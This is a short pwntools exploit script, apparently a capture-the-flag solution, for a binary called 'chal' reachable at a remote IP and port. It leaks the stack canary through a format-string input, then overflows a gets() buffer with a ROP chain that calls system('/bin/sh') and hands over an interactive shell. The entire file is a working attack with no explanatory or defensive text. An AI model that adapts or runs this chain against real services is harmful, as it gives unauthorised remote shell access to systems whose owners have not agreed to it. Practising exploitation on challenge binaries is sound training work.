from pwn import *

context.binary = elf = ELF('./chal')
context.log_level = 'info'

def start():
    if args.REMOTE:
        return remote('10.21.232.223', 45787)
    return process('./chal')

p = start()

# 1) Leak canary with format string
p.recvuntil(b'What is your name?')
p.sendline(b'%15$p')
p.recvuntil(b'Hello ')
leak = p.recvline().strip()
canary = int(leak, 16)
log.success(f'Canary: {hex(canary)}')

# 2) Overflow via gets
p.recvuntil(b'Retype name for confirmation')

pop_rdi = 0x40122e
ret     = 0x40122f
bin_sh  = 0x402004
system  = 0x4010c0

payload  = b'A' * 40
payload += p64(canary)
payload += b'B' * 8
payload += p64(ret)          # stack alignment
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)

p.sendline(payload)
p.interactive()
